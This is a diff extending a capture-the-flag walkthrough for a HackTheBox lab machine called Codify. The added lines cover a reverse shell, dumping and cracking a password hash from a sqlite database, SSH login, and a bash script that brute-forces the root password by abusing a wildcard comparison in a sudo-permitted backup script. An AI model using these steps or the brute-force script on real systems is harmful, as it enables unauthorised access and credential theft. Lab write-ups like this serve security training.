@@ -20,7 +20,7 @@ $sudo nmap -sC -sV  10.10.11.239
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
 
-add to /etc/hosts
+Add to /etc/hosts
     10.10.11.239 codify.htb
 
 Go to http://codify.htb/
@@ -52,5 +52,68 @@ Use this code in the Editor page and  " $nc -lvnp 4440 " on local machine
 
 	console.log(vm.run(code));
 
+Reverse shell to codify machine.
+    svc@codify:/var/www/contact$ sqlite3 tickets.db
+	sqlite3 tickets.db
+	.tables
+	tickets  users  
+	select * from users;
+    xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Hash for user password.
+
+In local machine
+    echo ' ' > hash #use hash from last step
+    $john hash
+
+SSH connection to 10.10.11.239
+joshua@codify:~$ ls
+user.txt
+
+$ cat user.txt
+xxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
+$sudo su
+    Not much to see
+
+joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+
+We have access to a file called mysql-backup.sh. Which we can brute force
+
+From https://gist.github.com/m3m0o/d361597c44d252620919257641e11fc4 use this code to brute force root password
+   	#!/bin/bash
+    password=""
+
+	while true; do
+	    password_check=$(echo "$password" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)
+
+	    if [ $password_check -gt 2 ]
+	    then
+		echo "$password"
+		break
+	    fi
+
+	    for char in {a..z} {A..Z} {0..9}; do
+		result_number_of_lines=$(echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)
+
+		if [ $result_number_of_lines -gt 2 ]
+		then
+		    password="$password$char"
+		    continue
+		fi
+	    done
+	done
+
+Voilè!
+$cat root.txt 
+xxxxxxxxxxxxxxxxxxxxxxxx
+
+
+HAVE FUN!
